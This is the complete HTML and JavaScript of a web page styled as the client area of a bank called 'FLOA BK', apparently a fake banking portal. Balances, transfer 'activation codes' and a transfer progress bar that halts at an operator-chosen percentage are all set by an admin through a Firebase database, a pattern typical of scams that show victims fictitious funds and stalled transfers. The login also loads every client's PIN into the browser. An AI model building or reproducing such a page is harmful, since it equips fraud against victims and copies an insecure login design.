<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FLOA BK</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280}
*{box-sizing:border-box;font-family:system-ui,Arial,sans-serif}
body{margin:0;background:var(--bg)}
.screen{display:none;min-height:100vh}.screen.active{display:block}
.btn{width:100%;padding:14px;background:var(--p);color:#fff;border:0;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
.input{width:100%;padding:12px;border:1px solid #d1d5db;border-radius:8px;font-size:15px}
.card{background:#fff;border:1px solid var(--b);border-radius:12px;padding:20px;margin:16px;box-shadow:0 2px 6px rgba(0,0,0,.05)}
header{background:#fff;padding:14px 18px;border-bottom:1px solid var(--b);font-weight:800;font-size:20px;color:var(--p);letter-spacing:1px}
</style>
</head>
<body>

<!-- LOGIN -->
<section id="login" class="screen active">
<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px">
<div style="background:#fff;padding:30px;border-radius:14px;width:100%;max-width:360px;box-shadow:0 4px 14px rgba(0,0,0,.08)">
<div style="width:80px;height:80px;background:var(--p);border-radius:50%;margin:0 auto 18px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;font-weight:800">FB</div>
<h1 style="text-align:center;font-size:32px;color:var(--p);margin:0 0 4px;letter-spacing:1.5px">FLOA BK</h1>
<p style="text-align:center;color:var(--m);margin:0 0 22px;font-size:13px">Strefa klienta</p>
<input id="email" class="input" type="email" placeholder="Email" style="margin-bottom:10px">
<input id="pin" class="input" type="password" placeholder="PIN (6 chiffres)" maxlength="6" style="margin-bottom:14px;border:2px solid var(--p)">
<button class="btn" id="loginBtn">Zaloguj się</button>
<p id="status" style="text-align:center;font-size:12px;color:var(--m);margin-top:10px">Connexion Firebase...</p>
<p id="err" style="display:none;color:#dc2626;text-align:center;margin-top:8px;font-size:13px"></p>
</div></div>
</section>

<!-- DASHBOARD -->
<section id="dash" class="screen">
<header>FLOA BK</header>
<div class="card">
<div style="color:var(--m);font-size:13px">Witaj, <b id="name"></b></div>
<div style="font-size:32px;font-weight:700;margin:8px 0" id="bal">0 zł</div>
<button class="btn" onclick="go('transfer')">Wykonaj przelew</button>
</div>
</section>

<!-- TRANSFER -->
<section id="transfer" class="screen">
<header>FLOA BK</header>
<div class="card">
<input id="amt" class="input" placeholder="Kwota" style="margin-bottom:10px">
<input id="ben" class="input" placeholder="Beneficjent" style="margin-bottom:10px">
<input id="iban" class="input" placeholder="IBAN" style="margin-bottom:14px">
<button class="btn" onclick="go('verify')">Dalej</button>
</div>
</section>

<!-- VERIFY -->
<section id="verify" class="screen">
<header>FLOA BK</header>
<div class="card">
<p style="margin-bottom:8px">Kwota: <b id="vamt"></b></p>
<input id="code" class="input" placeholder="Kod aktywacyjny" style="margin-bottom:12px">
<button class="btn" id="okBtn">Potwierdź</button>
<div id="prog" style="display:none;margin-top:14px">
<div style="background:#eee;height:8px;border-radius:4px"><div id="bar" style="height:8px;background:var(--p);width:0%"></div></div>
<p id="ptxt" style="font-size:12px;margin-top:6px;color:var(--m)"></p>
</div>
</div>
</section>

<script type="module">
import {initializeApp} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
import {getDatabase,ref,get} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
  authDomain: "vantex-admin-2026.firebaseapp.com",
  databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "vantex-admin-2026",
  storageBucket: "vantex-admin-2026.firebasestorage.app",
  messagingSenderId: "810884502320",
  appId: "1:810884502320:web:b5ba7c2909ddf4ccf02ef5"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
let user = null;

const $ = i => document.getElementById(i);
const go = id => {document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));$(id).classList.add('active')};
window.go = go;
const fmt = n => new Intl.NumberFormat('pl-PL').format(Number(n)||0) + ' zł';

// Test connexion
get(ref(db,'clients')).then(()=>{$('status').textContent='Firebase connecté ✓';$('status').style.color='green'}).catch(()=>{$('status').textContent='Erreur connexion Firebase';$('status').style.color='red'});

$('loginBtn').onclick = async () => {
  const email = $('email').value.trim().toLowerCase();
  const pin = $('pin').value.trim();
  $('err').style.display='none';
  if(!email||!pin){$('err').textContent='Entre email et PIN';$('err').style.display='block';return}
  $('loginBtn').textContent='Connexion...'; $('loginBtn').disabled=true;
  try{
    const snap = await get(ref(db,'clients'));
    const data = snap.val()||{};
    let found = null;
    for(const id in data){const v=data[id]; if(v.email && v.email.toLowerCase()===email && v.pin===pin){found={id,...v};break}}
    if(!found){$('err').textContent='Compte introuvable ou PIN faux - crée-le dans ADMIN';$('err').style.display='block';$('loginBtn').textContent='Zaloguj się';$('loginBtn').disabled=false;return}
    user = found;
    $('name').textContent = user.nom;
    $('bal').textContent = fmt(user.montant);
    go('dash');
  }catch(e){$('err').textContent='Erreur Firebase: '+e.message;$('err').style.display='block'}
  $('loginBtn').textContent='Zaloguj się';$('loginBtn').disabled=false;
};

document.querySelector('#transfer .btn').onclick = ()=>{$('vamt').textContent=($('amt').value||'0')+' zł';go('verify')};

$('okBtn').onclick = ()=>{
  if($('code').value.trim()!==user.code){alert('Kod błędny');return}
  const pct = Number(user.pct)||100;
  $('prog').style.display='block'; let w=0;
  const int=setInterval(()=>{w+=2;const cur=Math.min(w,pct);$('bar').style.width=cur+'%';$('ptxt').textContent=cur+'%';if(w>=pct){clearInterval(int);$('ptxt').textContent=pct<100?'Virement arrêté à '+pct+'%':user.msg||'Przelew zatwierdzony ✓';setTimeout(()=>go('dash'),1500)}},30);
};
</script>
</body>
</html>
